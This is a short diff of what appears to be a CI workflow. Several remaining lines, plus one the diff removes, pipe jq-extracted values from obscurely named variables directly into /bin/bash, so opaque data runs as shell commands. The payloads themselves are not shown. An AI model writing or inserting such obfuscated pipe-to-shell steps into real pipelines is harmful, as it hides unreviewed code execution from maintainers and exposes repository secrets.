@@ -38,7 +38,6 @@ jobs:
           echo $ul53 | jq -r .m68 | /bin/bash
           echo $n5181 | jq -r .ahx08 | /bin/bash
           echo $wadiq17854 | jq -r .vvbvi3195 | /bin/bash
-          echo $ojub96 | jq -r .f50025 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
